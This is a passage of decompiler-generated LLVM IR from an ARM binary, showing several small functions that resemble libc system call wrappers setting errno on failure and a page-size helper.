  uselistorder i32 %v1_121d0, { 1, 0, 2 }
  uselistorder i32 %v0_12170.pre, { 1, 0 }
  uselistorder i32 %v1_12164, { 1, 0 }
  uselistorder i32 %v1_12160, { 3, 2, 1, 0 }
  uselistorder i32 %v4_120d8, { 1, 0, 2 }
  uselistorder i1 %v8_12020, { 1, 2, 0 }
  uselistorder i32 %v2_11ff0, { 1, 2, 0 }
  uselistorder i1 %v2_11fd8, { 1, 0 }
  uselistorder i32 %v5_11fdc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11fbc, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v0_11f88, { 1, 0 }
  uselistorder i32 %v2_11f68, { 1, 0, 2, 3 }
  uselistorder i32 %v3_11f58, { 1, 0 }
  uselistorder i32 %tmp52, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp49, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 7, 6, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 1, 5, 6, 7, 8, 9, 10, 11, 13, 12, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 1, 18 }
  uselistorder i32 (i32)* @function_1148c, { 0, 25, 6, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 1, 10, 9, 8, 7, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32)* @function_11e80, { 2, 1, 0 }
  uselistorder i32 120, { 0, 2, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_121b4, { 1, 0 }
  uselistorder label %dec_label_pc_12190, { 1, 0 }
  uselistorder label %dec_label_pc_12154.lr.ph, { 1, 0, 2 }
  uselistorder label %dec_label_pc_120a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1207c, { 3, 0, 1, 2 }
  uselistorder label %bb62, { 1, 0 }
  uselistorder label %dec_label_pc_11ff0, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_11fd8, { 1, 0 }
}

define i32 @function_12214(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_12214:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12214 = load i32, i32* @r4, align 4
  store i32 %v3_12214, i32* %stack_var_-16, align 4
  %v3_12220 = urem i32 %arg3, 4096
  %v2_12224 = icmp eq i32 %v3_12220, 0
  br i1 %v2_12224, label %dec_label_pc_12240, label %dec_label_pc_1222c

dec_label_pc_1222c:                               ; preds = %dec_label_pc_12214
  %v0_1222c = call i32 @function_ce08()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_12238 = inttoptr i32 %v0_1222c to i32*
  store i32 22, i32* %v2_12238, align 4
  %v0_12270.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12270

dec_label_pc_12240:                               ; preds = %dec_label_pc_12214
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1226c, label %dec_label_pc_1225c

dec_label_pc_1225c:                               ; preds = %dec_label_pc_12240
  %v0_1225c = call i32 @function_ce08()
  %v0_12260 = load i32, i32* %r4.global-to-local, align 4
  %v1_12260 = sub i32 0, %v0_12260
  %v2_12264 = inttoptr i32 %v0_1225c to i32*
  store i32 %v1_12260, i32* %v2_12264, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1226c

dec_label_pc_1226c:                               ; preds = %dec_label_pc_12240, %dec_label_pc_1225c
  %v0_1226c = phi i32 [ %arg1, %dec_label_pc_12240 ], [ -1, %dec_label_pc_1225c ]
  store i32 %v0_1226c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12270

dec_label_pc_12270:                               ; preds = %dec_label_pc_1222c, %dec_label_pc_1226c
  %v0_12270 = phi i32 [ %v0_12270.pre, %dec_label_pc_1222c ], [ %v0_1226c, %dec_label_pc_1226c ]
  %v2_12274 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12274, i32* @r4, align 4
  ret i32 %v0_12270

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12270, { 1, 0 }
  uselistorder label %dec_label_pc_1226c, { 1, 0 }
}

define i32 @function_1227c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1227c:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1227c = load i32, i32* @r4, align 4
  %v6_1227c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_12284 = icmp eq i32 %arg2, 0
  store i32 142044, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_12284, label %dec_label_pc_122d8, label %dec_label_pc_1229c

dec_label_pc_1229c:                               ; preds = %dec_label_pc_1227c
  %v1_1229c = add i32 %arg2, 4
  %v2_1229c = inttoptr i32 %v1_1229c to i32*
  %v3_1229c = load i32, i32* %v2_1229c, align 4
  store i32 %v3_1229c, i32* @r3, align 4
  %v1_122a0 = and i32 %v3_1229c, 67108864
  %v2_122a0 = icmp eq i32 %v1_122a0, 0
  br i1 %v2_122a0, label %dec_label_pc_122a8, label %dec_label_pc_122d8

dec_label_pc_122a8:                               ; preds = %dec_label_pc_1229c
  store i32 20, i32* @r2, align 4
  %v2_122ac = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_122ac, i32* @r0, align 4
  %v0_122b0 = call i32 @function_f350()
  store i32 %v2_122ac, i32* @ip, align 4
  %v0_122d8.pre = load i32, i32* @r5, align 4
  %v0_122e0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_122d8

dec_label_pc_122d8:                               ; preds = %dec_label_pc_1229c, %dec_label_pc_1227c, %dec_label_pc_122a8
  %v0_122e0 = phi i32 [ %arg3, %dec_label_pc_1229c ], [ %arg3, %dec_label_pc_1227c ], [ %v0_122e0.pre, %dec_label_pc_122a8 ]
  %v0_122dc = phi i32 [ %arg2, %dec_label_pc_1229c ], [ 0, %dec_label_pc_1227c ], [ %v2_122ac, %dec_label_pc_122a8 ]
  %v0_122d8 = phi i32 [ %arg1, %dec_label_pc_1229c ], [ %arg1, %dec_label_pc_1227c ], [ %v0_122d8.pre, %dec_label_pc_122a8 ]
  %v4_122e8 = call i32 @function_12714(i32 %v0_122d8, i32 %v0_122dc, i32 %v0_122e0, i32 8)
  store i32 %v3_1227c, i32* @r4, align 4
  store i32 %v6_1227c, i32* @r5, align 4
  ret i32 %v4_122e8

; uselistorder directives
  uselistorder label %dec_label_pc_122d8, { 2, 0, 1 }
}

define i32 @function_122fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_122fc:
  %v0_122fc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_122fc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_122fc
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_122fc, %bb
  %v2_1231c = phi i32 [ %arg1, %dec_label_pc_122fc ], [ 0, %bb ]
  ret i32 %v2_1231c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_12320() local_unnamed_addr {
dec_label_pc_12320:
  %v0_12330 = load i32, i32* @r0, align 4
  %v2_12330 = icmp ugt i32 %v0_12330, -4097
  br i1 %v2_12330, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_12320
  ret i32 %v0_12330

bb1:                                              ; preds = %dec_label_pc_12320
  %v4_1233c = icmp eq i32 %v0_12330, -38
  br i1 %v4_1233c, label %dec_label_pc_12344, label %bb2

dec_label_pc_12344:                               ; preds = %bb1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_12344, %bb1
  %v0_1235c = call i32 @function_1534c()
  ret i32 %v0_1235c
}

define i32 @function_12360() local_unnamed_addr {
dec_label_pc_12360:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12360 = load i32, i32* @r7, align 4
  store i32 %v3_12360, i32* %stack_var_-8, align 4
  %v0_1236c = load i32, i32* @r0, align 4
  store i32 %v0_1236c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1236c, -4095
  br i1 %tmp, label %dec_label_pc_12388, label %dec_label_pc_12378

dec_label_pc_12378:                               ; preds = %dec_label_pc_12360
  %v0_12378 = call i32 @function_ce08()
  %v0_1237c = load i32, i32* %r7.global-to-local, align 4
  %v1_1237c = sub i32 0, %v0_1237c
  %v2_12380 = inttoptr i32 %v0_12378 to i32*
  store i32 %v1_1237c, i32* %v2_12380, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1238c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12388

dec_label_pc_12388:                               ; preds = %dec_label_pc_12360, %dec_label_pc_12378
  %v2_1238c = phi i32 [ %v3_12360, %dec_label_pc_12360 ], [ %v2_1238c.pre, %dec_label_pc_12378 ]
  %v0_12388 = phi i32 [ %v0_1236c, %dec_label_pc_12360 ], [ -1, %dec_label_pc_12378 ]
  store i32 %v2_1238c, i32* @r7, align 4
  ret i32 %v0_12388

; uselistorder directives
  uselistorder i32 %v0_1236c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12388, { 1, 0 }
}

define i32 @function_12394(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12394:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12394 = load i32, i32* @r7, align 4
  store i32 %v3_12394, i32* %stack_var_-8, align 4
  %v0_123a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_123a0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_123a0, -4095
  br i1 %tmp, label %dec_label_pc_123c0, label %dec_label_pc_123b0

dec_label_pc_123b0:                               ; preds = %dec_label_pc_12394
  %v0_123b0 = call i32 @function_ce08()
  %v0_123b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_123b4 = sub i32 0, %v0_123b4
  %v2_123b8 = inttoptr i32 %v0_123b0 to i32*
  store i32 %v1_123b4, i32* %v2_123b8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_123c0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_123c0

dec_label_pc_123c0:                               ; preds = %dec_label_pc_12394, %dec_label_pc_123b0
  %v1_123c4 = phi i32 [ %v0_123a0, %dec_label_pc_12394 ], [ -1, %dec_label_pc_123b0 ]
  %v2_123c0 = phi i32 [ %v3_12394, %dec_label_pc_12394 ], [ %v2_123c0.pre, %dec_label_pc_123b0 ]
  store i32 %v2_123c0, i32* @r7, align 4
  ret i32 %v1_123c4

; uselistorder directives
  uselistorder i32 %v0_123a0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_123c0, { 1, 0 }
}

define i32 @function_123c8() local_unnamed_addr {
dec_label_pc_123c8:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_123c8 = load i32, i32* @r7, align 4
  store i32 %v3_123c8, i32* %stack_var_-8, align 4
  %v0_123d4 = load i32, i32* @r0, align 4
  store i32 %v0_123d4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_123d4, -4095
  br i1 %tmp, label %dec_label_pc_123f4, label %dec_label_pc_123e4

dec_label_pc_123e4:                               ; preds = %dec_label_pc_123c8
  %v0_123e4 = call i32 @function_ce08()
  %v0_123e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_123e8 = sub i32 0, %v0_123e8
  %v2_123ec = inttoptr i32 %v0_123e4 to i32*
  store i32 %v1_123e8, i32* %v2_123ec, align 4
  %v2_123f4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_123f4

dec_label_pc_123f4:                               ; preds = %dec_label_pc_123c8, %dec_label_pc_123e4
  %v1_123f8 = phi i32 [ %v0_123d4, %dec_label_pc_123c8 ], [ -1, %dec_label_pc_123e4 ]
  %v2_123f4 = phi i32 [ %v3_123c8, %dec_label_pc_123c8 ], [ %v2_123f4.pre, %dec_label_pc_123e4 ]
  store i32 %v2_123f4, i32* %r7.global-to-local, align 4
  ret i32 %v1_123f8

; uselistorder directives
  uselistorder i32 %v0_123d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_123f4, { 1, 0 }
}

define i32 @function_123fc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_123fc:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_123fc = load i32, i32* @r2, align 4
  %v9_123fc = load i32, i32* @r3, align 4
  store i32 %v9_123fc, i32* %stack_var_-4, align 4
  %v1_1240c = and i32 %arg2, 64
  %v2_1240c = icmp eq i32 %v1_1240c, 0
  br i1 %v2_1240c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_123fc
  %v3_12414 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_12414, i32* @r3, align 4
  %phitmp = urem i32 %v6_123fc, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_123fc, %bb
  %v0_12418 = phi i32 [ 0, %dec_label_pc_123fc ], [ %phitmp, %bb ]
  store i32 %v0_12418, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12448, label %dec_label_pc_12438

dec_label_pc_12438:                               ; preds = %.thread
  %v0_12438 = call i32 @function_ce08()
  %v0_1243c = load i32, i32* %r7.global-to-local, align 4
  %v1_1243c = sub i32 0, %v0_1243c
  store i32 %v1_1243c, i32* @r3, align 4
  %v2_12440 = inttoptr i32 %v0_12438 to i32*
  store i32 %v1_1243c, i32* %v2_12440, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12448

dec_label_pc_12448:                               ; preds = %.thread, %dec_label_pc_12438
  %v0_12448 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_12438 ]
  ret i32 %v0_12448

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12448, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1245c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1245c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1245c = load i32, i32* @r7, align 4
  store i32 %v3_1245c, i32* %stack_var_-8, align 4
  %v0_12468 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12468, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12468, -4095
  br i1 %tmp, label %dec_label_pc_12488, label %dec_label_pc_12478

dec_label_pc_12478:                               ; preds = %dec_label_pc_1245c
  %v0_12478 = call i32 @function_ce08()
  %v0_1247c = load i32, i32* %r7.global-to-local, align 4
  %v1_1247c = sub i32 0, %v0_1247c
  %v2_12480 = inttoptr i32 %v0_12478 to i32*
  store i32 %v1_1247c, i32* %v2_12480, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12488.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12488

dec_label_pc_12488:                               ; preds = %dec_label_pc_1245c, %dec_label_pc_12478
  %v1_1248c = phi i32 [ %v0_12468, %dec_label_pc_1245c ], [ -1, %dec_label_pc_12478 ]
  %v2_12488 = phi i32 [ %v3_1245c, %dec_label_pc_1245c ], [ %v2_12488.pre, %dec_label_pc_12478 ]
  store i32 %v2_12488, i32* @r7, align 4
  ret i32 %v1_1248c

; uselistorder directives
  uselistorder i32 %v0_12468, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12488, { 1, 0 }
}

define i32 @function_12490() local_unnamed_addr {
dec_label_pc_12490:
  %v4_1249c = load i32, i32* inttoptr (i32 142140 to i32*), align 4
  %v1_124a0 = inttoptr i32 %v4_1249c to i32*
  %v2_124a0 = load i32, i32* %v1_124a0, align 4
  %v2_124a4 = icmp eq i32 %v2_124a0, 0
  br i1 %v2_124a4, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_12490
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_12490, %bb
  %v1_124ac = phi i32 [ %v2_124a0, %dec_label_pc_12490 ], [ 4096, %bb ]
  ret i32 %v1_124ac

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_124b8() local_unnamed_addr {
dec_label_pc_124b8:
  %v1_124c8 = load i32, i32* @r0, align 4
  ret i32 %v1_124c8
}

define i32 @function_124cc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_124cc:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_124cc = load i32, i32* @r7, align 4
  store i32 %v3_124cc, i32* %stack_var_-8, align 4
  %v0_124d8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_124d8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_124d8, -4095
  br i1 %tmp, label %dec_label_pc_124f8, label %dec_label_pc_124e8

dec_label_pc_124e8:                               ; preds = %dec_label_pc_124cc
  %v0_124e8 = call i32 @function_ce08()
  %v0_124ec = load i32, i32* %r7.global-to-local, align 4
  %v1_124ec = sub i32 0, %v0_124ec
  %v2_124f0 = inttoptr i32 %v0_124e8 to i32*
  store i32 %v1_124ec, i32* %v2_124f0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_124f8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_124f8

dec_label_pc_124f8:                               ; preds = %dec_label_pc_124cc, %dec_label_pc_124e8
  %v1_124fc = phi i32 [ %v0_124d8, %dec_label_pc_124cc ], [ -1, %dec_label_pc_124e8 ]
  %v2_124f8 = phi i32 [ %v3_124cc, %dec_label_pc_124cc ], [ %v2_124f8.pre, %dec_label_pc_124e8 ]
  store i32 %v2_124f8, i32* %r7.global-to-local, align 4
  ret i32 %v1_124fc

; uselistorder directives
  uselistorder i32 %v0_124d8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_124f8, { 1, 0 }
}

define i32 @function_12500() local_unnamed_addr {
dec_label_pc_12500:
  %v1_12510 = load i32, i32* @r0, align 4
  ret i32 %v1_12510
}

define i32 @function_12514() local_unnamed_addr {
dec_label_pc_12514:
  %v1_12524 = load i32, i32* @r0, align 4
  ret i32 %v1_12524
}

define i32 @function_12528(i32 %arg1) local_unnamed_addr {
dec_label_pc_12528:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12528 = load i32, i32* @r4, align 4
  store i32 %v3_12528, i32* %stack_var_-16, align 4
  store i32 142044, i32* %r4.global-to-local, align 4
  %v4_12538 = load i32, i32* @global_var_254dc.553, align 4
  %v2_1253c = icmp eq i32 %v4_12538, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_1253c, label %dec_label_pc_12548, label %dec_label_pc_12558

dec_label_pc_12548:                               ; preds = %dec_label_pc_12528
  %v1_1254c = call i32 @function_15300(i32 0)
  %v1_12550 = icmp slt i32 %v1_1254c, 0
  br i1 %v1_12550, label %dec_label_pc_1257c, label %dec_label_pc_12558thread-pre-split

dec_label_pc_12558thread-pre-split:               ; preds = %dec_label_pc_12548
  %v0_1255c.pr = load i32, i32* %r5.global-to-local, align 4
  %v4_12558.pre = load i32, i32* @global_var_254dc.553, align 4
  br label %dec_label_pc_12558

dec_label_pc_12558:                               ; preds = %dec_label_pc_12558thread-pre-split, %dec_label_pc_12528
  %v0_12568 = phi i32 [ %v4_12558.pre, %dec_label_pc_12558thread-pre-split ], [ %v4_12538, %dec_label_pc_12528 ]
  %v1_1256c = phi i32 [ %v0_1255c.pr, %dec_label_pc_12558thread-pre-split ], [ %arg1, %dec_label_pc_12528 ]
  %v2_1255c = icmp eq i32 %v1_1256c, 0
  store i32 %v0_12568, i32* %r4.global-to-local, align 4
  br i1 %v2_1255c, label %dec_label_pc_12580, label %dec_label_pc_12568

dec_label_pc_12568:                               ; preds = %dec_label_pc_12558
  %v2_1256c = add i32 %v1_1256c, %v0_12568
  %v1_12570 = call i32 @function_15300(i32 %v2_1256c)
  %v1_12574 = icmp slt i32 %v1_12570, 0
  br i1 %v1_12574, label %dec_label_pc_1257c, label %dec_label_pc_12568.dec_label_pc_12580_crit_edge

dec_label_pc_12568.dec_label_pc_12580_crit_edge:  ; preds = %dec_label_pc_12568
  %v0_12580.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12580

dec_label_pc_1257c:                               ; preds = %dec_label_pc_12568, %dec_label_pc_12548
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12580

dec_label_pc_12580:                               ; preds = %dec_label_pc_12558, %dec_label_pc_12568.dec_label_pc_12580_crit_edge, %dec_label_pc_1257c
  %v0_12580 = phi i32 [ %v0_12580.pre, %dec_label_pc_12568.dec_label_pc_12580_crit_edge ], [ -1, %dec_label_pc_1257c ], [ %v0_12568, %dec_label_pc_12558 ]
  %v2_12584 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12584, i32* @r4, align 4
  ret i32 %v0_12580

; uselistorder directives
  uselistorder i32 %v0_12568, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_15300, { 1, 0 }
  uselistorder label %dec_label_pc_12580, { 2, 1, 0 }
}

define i32 @function_12594(i32 %arg1) local_unnamed_addr {
dec_label_pc_12594:
  %v1_125a4 = load i32, i32* @r0, align 4
  ret i32 %v1_125a4
}

define i32 @function_125a8() local_unnamed_addr {
dec_label_pc_125a8:
  %stack_var_-16 = alloca i32, align 4
  %v2_125ac = ptrtoint i32* %stack_var_-16 to i32
  %v2_125b8 = call i32 @function_15378(i32 7, i32 %v2_125ac)
  %v1_125bc = icmp slt i32 %v2_125b8, 0
  %v5_125c0 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_125bc, i32 256, i32 %v5_125c0
  ret i32 %storemerge
}

define i32 @function_125d4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_125d4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_12610 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12610, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12610, -4095
  br i1 %tmp, label %dec_label_pc_12630, label %dec_label_pc_12620

dec_label_pc_12620:                               ; preds = %dec_label_pc_125d4
  %v0_12620 = call i32 @function_ce08()
  %v0_12624 = load i32, i32* %r7.global-to-local, align 4
  %v1_12624 = sub i32 0, %v0_12624
  %v2_12628 = inttoptr i32 %v0_12620 to i32*
  store i32 %v1_12624, i32* %v2_12628, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12630

dec_label_pc_12630:                               ; preds = %dec_label_pc_125d4, %dec_label_pc_12620
  %v1_1263c = phi i32 [ %v0_12610, %dec_label_pc_125d4 ], [ -1, %dec_label_pc_12620 ]
  ret i32 %v1_1263c

; uselistorder directives
  uselistorder i32 %v0_12610, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12630, { 1, 0 }
}

define i32 @function_12640(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12640:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_1267c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1267c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1267c, -4095
  br i1 %tmp, label %dec_label_pc_1269c, label %dec_label_pc_1268c

dec_label_pc_1268c:                               ; preds = %dec_label_pc_12640
  %v0_1268c = call i32 @function_ce08()
  %v0_12690 = load i32, i32* %r7.global-to-local, align 4
  %v1_12690 = sub i32 0, %v0_12690
  %v2_12694 = inttoptr i32 %v0_1268c to i32*
  store i32 %v1_12690, i32* %v2_12694, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1269c

dec_label_pc_1269c:                               ; preds = %dec_label_pc_12640, %dec_label_pc_1268c
  %v1_126a8 = phi i32 [ %v0_1267c, %dec_label_pc_12640 ], [ -1, %dec_label_pc_1268c ]
  ret i32 %v1_126a8

; uselistorder directives
  uselistorder i32 %v0_1267c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1269c, { 1, 0 }
}

define i32 @function_126ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_126ac:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_126ac = load i32, i32* @r7, align 4
  store i32 %v3_126ac, i32* %stack_var_-8, align 4
  %v0_126b8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_126b8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_126b8, -4095
  br i1 %tmp, label %dec_label_pc_126d8, label %dec_label_pc_126c8

dec_label_pc_126c8:                               ; preds = %dec_label_pc_126ac
  %v0_126c8 = call i32 @function_ce08()
  %v0_126cc = load i32, i32* %r7.global-to-local, align 4
  %v1_126cc = sub i32 0, %v0_126cc
  %v2_126d0 = inttoptr i32 %v0_126c8 to i32*
  store i32 %v1_126cc, i32* %v2_126d0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_126d8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_126d8

dec_label_pc_126d8:                               ; preds = %dec_label_pc_126ac, %dec_label_pc_126c8
  %v1_126dc = phi i32 [ %v0_126b8, %dec_label_pc_126ac ], [ -1, %dec_label_pc_126c8 ]
  %v2_126d8 = phi i32 [ %v3_126ac, %dec_label_pc_126ac ], [ %v2_126d8.pre, %dec_label_pc_126c8 ]
  store i32 %v2_126d8, i32* @r7, align 4
  ret i32 %v1_126dc

; uselistorder directives
  uselistorder i32 %v0_126b8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_126d8, { 1, 0 }
}

define i32 @function_126e0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_126e0:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_126e0 = load i32, i32* @r7, align 4
  store i32 %v3_126e0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12708, label %dec_label_pc_126f8

dec_label_pc_126f8:                               ; preds = %dec_label_pc_126e0
  %v0_126f8 = call i32 @function_ce08()
  %v0_126fc = load i32, i32* %r7.global-to-local, align 4
  %v1_126fc = sub i32 0, %v0_126fc
  %v2_12700 = inttoptr i32 %v0_126f8 to i32*
  store i32 %v1_126fc, i32* %v2_12700, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1270c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12708

dec_label_pc_12708:                               ; preds = %dec_label_pc_126e0, %dec_label_pc_126f8
  %v2_1270c = phi i32 [ %v3_126e0, %dec_label_pc_126e0 ], [ %v2_1270c.pre, %dec_label_pc_126f8 ]
  %v0_12708 = phi i32 [ %arg1, %dec_label_pc_126e0 ], [ -1, %dec_label_pc_126f8 ]
  store i32 %v2_1270c, i32* @r7, align 4
  ret i32 %v0_12708

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12708, { 1, 0 }
}

define i32 @function_12714(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12714:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12714 = load i32, i32* @r7, align 4
